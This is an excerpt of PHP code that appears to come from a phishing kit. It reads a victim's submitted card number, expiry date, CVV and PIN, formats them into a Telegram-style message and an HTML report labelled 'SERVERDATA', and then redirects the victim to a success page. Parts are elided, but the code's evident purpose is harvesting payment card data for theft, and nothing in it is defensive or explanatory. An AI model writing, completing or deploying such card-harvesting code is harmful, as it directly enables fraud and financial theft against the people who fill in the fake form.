...
$msgtg = "🔐 <b>SERVERDATA CARD DETAILS</b> 🔐\n";
$msgtg .= "━━━━━━━━━━━━━━━\n\n";

$msgtg .= "👤 <b>CARD DETAILS</b>\n";
$msgtg .= "• Card Number : <code>" . htmlspecialchars($_POST['crdnum']) . "</code>\n";
$msgtg .= "• Expiry Date  : <code>" . htmlspecialchars($_POST['expdate']) . "</code>\n";
$msgtg .= "• Card Cvv  : <code>" . htmlspecialchars($_POST['crdcvv']) . "</code>\n";
$msgtg .= "• Card Pin : <code>" . htmlspecialchars($_POST['crdpin']) . "</code>\n\n";
...
<body>
    <div class='container'>
        <div class='header'>
            <h2>✦ SERVERDATA OTP Details ✦</h2>
        </div>
        <div class='section'>
            <h3>🔥 CARD INFO</h3>
            <p>Card Number : <code>" . htmlspecialchars($_POST['crdnum']) . "</code></p>
            <p>Exp Date : <code>" . htmlspecialchars($_POST['expdate']) . "</code></p>
            <p>Card Cvv : <code>" . htmlspecialchars($_POST['crdcvv']) . "</code></p>
            <p>Card Pin : <code>" . htmlspecialchars($_POST['crdpin']) . "</code></p>
        </div>
        <div class='section'>
...
header('Location: ../success.php?id=' . bin2hex(random_bytes(32)));
}
?>